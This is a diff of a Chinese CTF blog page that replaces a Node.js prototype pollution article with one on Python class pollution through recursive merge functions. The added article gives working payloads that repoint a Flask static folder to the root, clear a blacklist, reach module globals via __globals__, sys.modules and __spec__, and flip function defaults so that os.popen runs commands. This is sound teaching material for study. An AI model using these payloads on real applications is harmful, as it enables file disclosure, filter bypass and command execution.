@@ -4,10 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="nodejs原型链污染, ctf*web*student">
-    <meta name="description" content="补充constructor.prototype可以代替**proto**
-前置知识先来了解一下Nodejs和JavaScipt和JSON的区别吧，一直也是懵懵懂懂
-如果没有node，那么我们的JavaScript代码则由浏览器中的JavaS">
+    <meta name="keywords" content="python原型链污染, ctf*web*student">
+    <meta name="description" content="基础payload直接污染static目录
+data = {
+    &#34;__init__&#34;:{
+        &#34;__globals__&#34;:{
+                &#34;app&#34;:{
+                        ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +22,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>nodejs原型链污染 | 青云阁</title>
+    <title>python原型链污染 | 青云阁</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -366,12 +369,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">nodejs原型链污染</h1>
+                    <h1 class="description center-align post-title">python原型链污染</h1>
                 </div>
             </div>
         </div>
@@ -399,8 +402,8 @@
                                 <span class="chip bg-color">Web</span>
                             </a>
                         
-                            <a href="/tags/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
-                                <span class="chip bg-color">nodejs原型链污染</span>
+                            <a href="/tags/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+                                <span class="chip bg-color">python原型链污染</span>
                             </a>
                         
                     </div>
@@ -438,14 +441,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    2.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    9 分
                 </div>
                 
 
@@ -470,154 +473,364 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>constructor.prototype</strong>可以代替**<strong>proto</strong>**</p>
-<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>先来了解一下<strong>Nodejs和JavaScipt和JSON的区别</strong>吧，一直也是懵懵懂懂</p>
-<p>如果没有node，那么我们的JavaScript代码则由浏览器中的<strong>JavaScript解析器</strong>进行解析。几乎所有的浏览器都配备了JavaScript的解析功能（最出名的就是google的v8）， 这也是为什么我们能在f12中直接执行JavaScript的原因</p>
-<p>而Nodejs则是由这个解析器单独从浏览器中拿出来，并进行了一系列的处理，最后成为了一个可以在服务端运行JavaScript的环境</p>
-<p>JSON是JavaScript的对象表示方法，它表示的是声明对象的一种格式， 由于我们从前端接收到的数据基本都是字符串，因此在服务端如果要将这些字符串处理为其他格式，比如对象，就需要用到JSON了。</p>
-<p>接着便是引入我们的nodejs原型链污染的知识了</p>
-<h5 id="原型对象（prototype）与原型连接点（proto）与原型链"><a href="#原型对象（prototype）与原型连接点（proto）与原型链" class="headerlink" title="原型对象（prototype）与原型连接点（proto）与原型链"></a>原型对象（prototype）与原型连接点（<strong>proto</strong>）与原型链</h5><p>在c++或java这些面向对象的语言中，我们如果想要一个对象，首先需要使用关键字class声明一个类，再使用关键字new一个对象出来(经常书写的php也是这样)，但是在JavaScript中没有class以及类这种概念（为了简化编写JavaScript代码，ECMAScript 6后增加了class语法，但class其实只是一个语法糖）。 在JavaScript有这么两种声明对象的方式</p>
-<p><strong>直接实例化构造方法Object()来创建对象</strong></p>
-<pre class="line-numbers language-language-python"><code class="language-language-python">person=new Object()
-person.firstname="John";
-person.lastname="Doe";
-person.age=50;
-person.eyecolor="blue";
-
-这种创建对象的方法还有另一种写法 如下
-person={firstname:"John",lastname:"Doe",age:50,eyecolor:"blue"};
-这种方法通过直接实例化构造方法Object()来创建对象
+                <h1 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h1><p><strong>直接污染static目录</strong></p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">data = {
+    "__init__":{
+        "__globals__":{
+                "app":{
+                        "_static_folder": "/"
+                    }
+            }
+    }
+}
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>先创建构造函数 再实例化构造函数</strong></p>
-<pre class="line-numbers language-language-python"><code class="language-language-python">function person(firstname,lastname,age,eyecolor)  这里创建了一个“类” 但是在JavaScript中叫做构造函数或者构造器
-{
-    this.firstname=firstname;
-    this.lastname=lastname;
-    this.age=age;
-    this.eyecolor=eyecolor;
+<p>直接把static污染成根目录，假设存在/flag的子网和/flag的文件存放flag就能直接下载flag</p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">{
+    "__init__": {
+        "__globals__": {
+                    "BLACKLIST_IN_index": ""
+            }
+    }
 }
-var myFather=new person("John","Doe",50,"blue");    通过这个“类”实例化对象
-var myMother=new person("Sally","Rally",48,"green");
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这种攻击方式可以在Python中实现对类属性值的污染。需要注意的是，由于Python中的安全设定和部分特殊属性类型限定，并不是所有的类其所有的属性都是可以被污染的，不过可以肯定的，污染只对类的属性起作用，对于类方法是无效的。</p>
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="合并函数"><a href="#合并函数" class="headerlink" title="合并函数#"></a>合并函数<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/17068716.html#%E5%90%88%E5%B9%B6%E5%87%BD%E6%95%B0"><font style="color:#003884;">#</font></a></h2><p>Pydash模块中的<strong>set_和set_with</strong>函数具有如下实例中<strong>merge</strong>函数类似的类属性赋值逻辑，能够实现污染攻击需要一个数值合并函数将特定值污染到类的属性当中，一个标准示例如下：</p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">def merge(src, dst):
+    # 遍历源字典 (src) 中的每一对键值对
+    for k, v in src.items():
+        # 检查目标对象 dst 是否是字典类型（具有 __getitem__ 方法）
+        if hasattr(dst, '__getitem__'):
+            # 如果目标字典中已经有这个键且对应的值是字典类型，则递归合并
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                # 否则直接将源字典中的值赋给目标字典的键
+                dst[k] = v
+        # 如果目标对象 dst 是具有指定属性的对象（通过 hasattr(dst, k) 判断）
+        # 并且源字典中的值是字典类型，则递归合并
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            # 否则将源字典的值赋给目标对象的属性
+            setattr(dst, k, v)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="污染示例-；"><a href="#污染示例-；" class="headerlink" title="污染示例 ；"></a>污染示例 ；</h2><p>由于Python中的类会继承父类中的属性，而类中声明（并不是实例中声明）的属性是唯一的，所以我们的目标就是这些在多个类、示例中仍然指向唯一的属性，如类中自定义属性及以__开头的内置属性等</p>
+<p>修改自定义属性示例</p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">class father:
+    secret = "haha"
 
-这种方法先创建构造函数 再实例化构造函数 构造函数function也属于Object 
-如果对这里为什么属于Object而不属于Function有疑问请继续阅读 下面会解释
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>既然是通过实例化Object来创建对象或创建构造函数，在JavaScript中有两个很特殊的对象，Function() 和 Object() ，它们两个既是构造函数也是对象，作为对象是不是应该有一个“类”去作为他们的模板呢？</p>
-<p>对于Object()来说，要声明这么一个构造函数我们可以使用关键字function来创建 。（在底层 使用function创建一个函数 其实就相当于这个过程）</p>
-<pre class="line-numbers language-language-python"><code class="language-language-python">function Object()
-{
-    
-}
-在底层为
-var Object = new Function();
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>先引入一些概念方便理解以下的讲解</p>
-<p><strong><strong>proto</strong><strong>是任何一个</strong>对象</strong>拥有的属性</p>
-<p><strong>prototype</strong>是任何一个<strong>函数</strong>拥有的一个属性</p>
-<p>那么对于Function自己这个对象，他是怎么来的呢？如果用<strong>Function.<strong>proto</strong><strong>和</strong>Function.prototype</strong>进行比较，发现<strong>二者是全等</strong>的，所以Function创造了自己，也创造了Object，所以JavaScript中，<strong>所有函数都是对象，而对象是通过函数创建的</strong>。因此</p>
-<p><strong>构造函数.prototype.__proto__应该是Object.prototype，而不是Function.prototype，Function的作用是创建而不是继承。</strong></p>
-<p><strong>eg;</strong></p>
-<p><strong>person=….</strong></p>
-<p>这个person对象就拥有了<strong>person.<strong>proto</strong><strong>这个属性，而Object()我们刚才提到了是由Function创建来的一个构造函数，那么Object就天生有了</strong>Object.prototype。</strong></p>
-<p>为什么要说这些呢就是为了说明白</p>
-<p>1.某一对象的__proto__指向它的prototype（原型对象）， 也就是说如果</p>
-<p><strong>直接访问person.<strong>proto</strong> 那么就相当于访问了Object.prototype。</strong></p>
-<p>2.JavaScript使用prototype链实现继承机制。</p>
-<p>3.构造函数xxx.prototype是一个对象，xxx.prototype也有自己的__proto__属性，并且可以继续指向它的的prototype。</p>
-<p>4.Object.prototype.proto最终指向null，这也是所有原型链的终点。</p>
-<p>5.从一个对象的__proto__不断向上指向原型对象，最终指向Objecct.prototype后，接着指向为Null，这一条链子就叫做原型链。</p>
-<h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a><strong>例子</strong></h6><p>这么长的文章也是讲的略显抽象，我们来个例子便于理解</p>
-<pre class="line-numbers language-language-python"><code class="language-language-python">function Father() {
-    this.first_name = 'Donald'
-    this.last_name = 'Trump'
-}
+class son_a(father):
+    pass
 
-function Son() {
-    this.first_name = 'Melania'
-}
+class son_b(father):
+    pass
 
-Son.prototype = new Father()
+def merge(src, dst):
+    # Recursive merge function
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
 
-let son = new Son()
-console.log(`Name: ${son.first_name} ${son.last_name}`)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>在上边的例子中（下边语言非正式完全准确，为个人总结便于理解，以待不断改正）</p>
-<p>son.__proto__就指向了Son.prototype</p>
-<p><strong>直接访问对象.<strong>proto</strong> 那么就相当于访问了构造函数.prototype。注意对于第一种的实例方法（没构造函数换句话说构造方法就是Object）会指向Object.prototype</strong></p>
-<p>Son.prototype.__proto__指向father.prototype</p>
-<p><strong>Son.prototype = new Father()+上一条理解</strong></p>
-<p>father.prototype.__proto__指向Object.prototype</p>
-<p><strong>构造函数.prototype.__proto__应该是Object.prototype</strong></p>
-<p>Object.prototype.proto指向null</p>
-<p><strong>Object.prototype.proto最终指向null，这也是所有原型链的终点。</strong></p>
-<p>我们在简单引入一下程序运行过程，以理解原型链污染の原理</p>
-<p>对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作：</p>
-<ol>
-<li><font style="color:rgb(0, 0, 0);">在对象son中寻找last_name。</font></li>
-<li><font style="color:rgb(0, 0, 0);">如果找不到，则在son.__proto__中寻找last_name。</font></li>
-<li><font style="color:rgb(0, 0, 0);">如果仍然找不到，则继续在son.<strong>proto</strong>.__proto__中寻找last_name。</font></li>
-<li><font style="color:rgb(0, 0, 0);">依次寻找，直到找到null结束。</font></li>
-</ol>
-<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a><strong>原型链污染</strong></h1><p>ok，前置知识基本已经明了，我们直接上例子来理解污染</p>
-<pre class="line-numbers language-language-python"><code class="language-language-python">// 这个对象直接实例化Object()
-let foo = {bar: 1}
-// foo.bar 此时为1
-console.log(foo.bar)
-// 修改foo的原型（即Object）
-foo.__proto__.bar = 2
-// 由于查找顺序的原因，foo.bar仍然是1
-console.log(foo.bar)
-// 此时再用Object创建一个空的zoo对象
-let zoo = {}
-// 查看zoo.bar
-console.log(zoo.bar)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这里由于修改了foo.<strong>proto</strong>.bar 也就是修改了Object.bar，因此在后续的实例化对象中，新的对象会继承这一属性 造成了原型链污染。</p>
-<p>但是上边很显然是我们自己的实验过程，在ctf中什么情况可以使用呢</p>
-<p>和python原型链污染类似，有合并函数对象merge，对象clone（其实内核就是将待操作的对象merge到一个空对象中），再举一个伪ctf的例子</p>
-<p>eg：</p>
-<pre class="line-numbers language-language-python"><code class="language-language-python">function merge(target, source) {
-    for (let key in source) {
-        if (key in source && key in target) {  
-            // 如果target与source有相同的键名 则让target的键值为source的键值
-            merge(target[key], source[key])
-        } else {
-            target[key] = source[key]  // 如果target与source没有相通的键名 则直接在target新建键名并赋给键值
+instance = son_b()
+payload = {
+    "__class__" : {
+        "__base__" : {
+            "secret" : "no way"
         }
     }
 }
-let o1 = {}
-let o2 = {a: 1, "__proto__": {b: 2}}
-merge(o1, o2)
-console.log(o1.a, o1.b)
 
-o3 = {}
-console.log(o3.b)
-//1 2
-//undefined
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><font style="color:rgb(43, 144, 91);">// 如果target与source没有相通的键名 则直接在target新建键名并赋给键值</font></p>
-<p>这里的__proto__被当作普通建值处理了，merge(o1, o2) 的执行相当于再o1新建merge(o1, o2) 的执行相当于也就是o1变成了**{a: 1, “<strong>proto</strong>“: {b: 2}}**</p>
-<p>原型对象Object并没有被更改</p>
-<p>我么稍作更改把o2以json格式传递来确保__proto__不被当做普通键值</p>
-<pre class="line-numbers language-language-python"><code class="language-language-python">let o1 = {}
-let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
-merge(o1, o2)
-console.log(o1.a, o1.b)
+print(son_a.secret)
+#haha
+print(instance.secret)
+#haha
+merge(payload, instance)
+print(son_a.secret)
+#no way
+print(instance.secret)
+#no way
+（关注值的更改和污染方式）
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="object无法污染"><a href="#object无法污染" class="headerlink" title="object无法污染"></a>object无法污染</h2><p>正如前面所述，并不是所有的类的属性都可以被污染，如<strong>Object的属性就无法被污染</strong>，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到</p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">def merge(src, dst):
+    # Recursive merge function
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
 
-o3 = {}
-console.log(o3.b)
-//1 2
-//2
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><font style="color:rgb(43, 144, 91);">// 如果target与source有相同的键名 则让target的键值为source的键值 merge(target[key], source[key])</font></p>
-<p>这里等于 merge(Object.prototype, b: 2)，把<strong>所有对象的原型都污染了，<strong>o1变成了</strong>{a:1,b: 2}</strong></p>
-<h1 id="深入理解-JavaScript-Prototype-污染攻击"><a href="#深入理解-JavaScript-Prototype-污染攻击" class="headerlink" title="深入理解 JavaScript Prototype 污染攻击"></a><strong>深入理解 JavaScript Prototype 污染攻击</strong></h1><p>以上内容过于复杂繁琐，我这里引用一下p神及其简洁的总结</p>
-<ol>
-<li><font style="color:rgb(0, 0, 0);">每个构造函数(constructor)都有一个原型对象(prototype)</font></li>
-<li><font style="color:rgb(0, 0, 0);">对象的__proto__属性，指向类的原型对象prototype</font></li>
-<li><font style="color:rgb(0, 0, 0);">JavaScript使用prototype链实现继承机制</font></li>
-</ol>
+payload = {
+    "__class__" : {
+            "__str__" : "Polluted ~"
+        }
+    }
+
+merge(payload, object)
+#TypeError: can't set attributes of built-in/extension type 'object'
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>在上边的介绍中污染类属性是<strong>通过示例的__base__属性查找到其继承的父类</strong>，但是如果目标类与切入点类或实例没有继承关系时，这种方法就显得十分无力</p>
+<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>在Python中，函数或类方法（对于类的内置方法如__init__这些来说，内置方法在并未重写时其数据类型为装饰器即wrapper_descriptor，只有在重写后才是函数function）均具有一个__globals__属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的globals函数的返回值）</p>
+<p>也就是说里面有所有的类与属性</p>
+<p>污染示例（注意类内变量修改和类外的区别）</p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">secret_var = 114
+
+def test():
+    pass
+
+class a:
+    secret_class_var = "secret"
+
+class b:
+    def __init__(self):
+        pass
+
+def merge(src, dst):
+    # Recursive merge function
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
+
+instance = b()
+
+payload = {
+    "__init__" : {
+            "__globals__" : {
+                "secret_var" : 514,
+                "a" : {
+                    "secret_class_var" : "Pooooluted ~"
+                }
+            }
+        }
+    }
+
+print(a.secret_class_var)
+#secret
+print(secret_var)
+#114
+merge(payload, instance)
+print(a.secret_class_var)
+#Pooooluted ~
+print(secret_var)
+#514
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="已加载模块"><a href="#已加载模块" class="headerlink" title="已加载模块"></a>已加载模块</h3><p>需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了—也就是说需要污染的在我们操作的下文</p>
+<p>简单的示例</p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">#test.py
+import test_1
+class cls:
+    def __init__(self):
+        pass
+def merge(src, dst):
+    # Recursive merge function
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
+instance = cls()
+
+payload = {
+    "__init__" : {
+        "__globals__" : {
+            "test_1" : {
+                "secret_var" : 514,
+                "target_class" : {
+                    "secret_class_var" : "Poluuuuuuted ~"
+                }
+            }
+        }
+    }
+}
+print(test_1.secret_var)
+#secret
+print(test_1.target_class.secret_class_var)
+#114
+merge(payload, instance)
+print(test_1.secret_var)
+#514
+print(test_1.target_class.secret_class_var)
+#Poluuuuuuted 
+
+secret_var = 114
+class target_class:
+
+    secret_class_var = "secret"
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们更改的secret_var等都在污染之后</p>
+<p>在加载关系简单的情况下，我们可以直接从文件的_<strong>import语法部分</strong>_找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块</p>
+<p>但是实际上带都是没法直接这么简单的直接查看的，我们就需要利用sys模块</p>
+<h4 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h4><p>sys模块的modules属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p>
+<p><em>也就是说勉强算是利用globals的进阶版，这里只上payload了</em></p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">payload = {
+    "__init__" : {
+        "__globals__" : {
+            "sys" : {
+                "modules" : {
+                    "test_1" : {
+                        "secret_var" : 514,
+                        "target_class" : {
+                            "secret_class_var" : "Poluuuuuuted ~"
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>当然我们去使用的Payload绝大部分情况下是不会这样的，如上的</p>
+<p>上边的Payload是在已经import sys的情况下使用的，而大部分情况是没有直接导入的，上述只是为了引出下文的真正的复杂的使用</p>
+<h4 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h4><p>这样问题就从<strong>寻找import特定模块的语句</strong>转换为**寻找import了sys模块的语句，**为了进一步简化问题，这里采用方式是利用Python中加载器loader</p>
+<p>加载器loader</p>
+<p>是为实现模块加载而设计的类，其在importlib这一内置模块中有具体实现</p>
+<p>关键是—-importlib模块下所有的py文件中均引入了sys模块</p>
+<p>只要我们能过获取到一个loader便能用如loader.<strong>init</strong>.<strong>globals</strong>[‘sys’]的方式拿到sys模块，这样进而获取目标模块。</p>
+<p>并且对于一个模块来说，模块中的一些<strong>内置属性会在被加载时自动填充</strong></p>
+<p>__loader__内置属性会被赋值为加载该模块的loader，这样只要能获取到任意的模块便能通过__loader__属性获取到loader，而且对于python3来说除了在debug模式下的主文件中__loader__为None以外，正常执行的情况每个模块__loader__属性均有一个对应的类</p>
+<h4 id="spec"><a href="#spec" class="headerlink" title="spec"></a><strong>spec</strong></h4><p>__spec__内置属性在Python 3.4版本引入，其包含了关于类加载时的信息，本是定义在Lib/importlib/_bootstrap.py的类ModuleSpec，显然因为定义在importlib模块下的py文件，所以可以直接采用</p>
+<p>&lt;模块名&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[‘sys’]获取到sys模块</p>
+<h4 id="ModuleSpec"><a href="#ModuleSpec" class="headerlink" title="ModuleSpec"></a>ModuleSpec</h4><p>由于ModuleSpec的属性值设置，相对于上面的获取方式，还有一种相对长的</p>
+<p>payload的获取方式，主要是利用ModuleSpec中的loader属性。如属性名所示，该属性的值是模块加载时所用的loader所以有这样的相对长的</p>
+<p>Payload：</p>
+<p>&lt;模块名&gt;.<strong>spec</strong>.loader.<strong>init</strong>.<strong>globals</strong>[‘sys’]</p>
+<p><strong>函数形参默认值替换</strong></p>
+<p>函数的__defaults__和__kwdefaults__这两个内置属性（分别获取位置或关键字参数，关键字参数）</p>
+<p>这里需要了解了解什么是位置或关键字参数和关键字参数</p>
+<p>即—-def name(p1, p2, /, p_or_kw, *, kw):</p>
+<p>为了便于理解给出实验示例</p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">def func_a(var_1, var_2 =2, var_3 = 3):
+    pass
+
+def func_b(var_1, /, var_2 =2, var_3 = 3):
+    pass
+    
+def func_c(var_1, var_2 =2, *, var_3 = 3):
+    pass
+
+def func_d(var_1, /, var_2 =2, *, var_3 = 3):
+    pass
+print(func_a.__defaults__)
+#(2, 3)
+
+print(func_b.__defaults__)
+#(2, 3)
+
+print(func_c.__defaults__)
+#(2,)
+
+print(func_d.__defaults__)
+#(2,)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如JSON等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式</p>
+<p>污染示例</p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">def evilFunc(arg_1 , shell = False):
+    if not shell:
+        print(arg_1)
+    else:
+        print(__import__("os").popen(arg_1).read())
+
+class cls:
+    def __init__(self):
+        pass
+
+def merge(src, dst):
+    # Recursive merge function
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
+instance = cls()
+payload = {
+    "__init__" : {
+        "__globals__" : {
+            "evilFunc" : {
+                "__defaults__" : (
+                    True ,
+                )
+            }
+        }
+    }
+}
+evilFunc("whoami")
+#whoami
+merge(payload, instance)
+evilFunc("whoami")
+#article-kelp
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>kw</p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">def evilFunc(arg_1 , * , shell = False):
+    if not shell:
+        print(arg_1)
+    else:
+        print(__import__("os").popen(arg_1).read())
+
+class cls:
+    def __init__(self):
+        pass
+
+def merge(src, dst):
+    # Recursive merge function
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
+
+instance = cls()
+
+payload = {
+    "__init__" : {
+        "__globals__" : {
+            "evilFunc" : {
+                "__kwdefaults__" : {
+                    "shell" : True
+                }
+            }
+        }
+    }
+}
+evilFunc("whoami")
+#whoami
+merge(payload, instance)
+evilFunc("whoami")
+#article-kelp
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
                 
             </div>
@@ -644,7 +857,7 @@ console.log(o3.b)
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://example.com/2025/04/17/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://example.com/2025/04/17/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a>
+                    <a href="https://example.com/2025/04/17/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://example.com/2025/04/17/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -686,8 +899,8 @@ console.log(o3.b)
                                     <span class="chip bg-color">Web</span>
                                 </a>
                             
-                                <a href="/tags/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
-                                    <span class="chip bg-color">nodejs原型链污染</span>
+                                <a href="/tags/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+                                    <span class="chip bg-color">python原型链污染</span>
                                 </a>
                             
                         </div>
@@ -732,7 +945,7 @@ console.log(o3.b)
         repo: '评论',
         owner: 'AYUNiversity',
         admin: "AYUNiversity",
-        id: '2025-04-17T10-37-03',
+        id: '2025-04-17T11-28-27',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -760,9 +973,10 @@ console.log(o3.b)
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
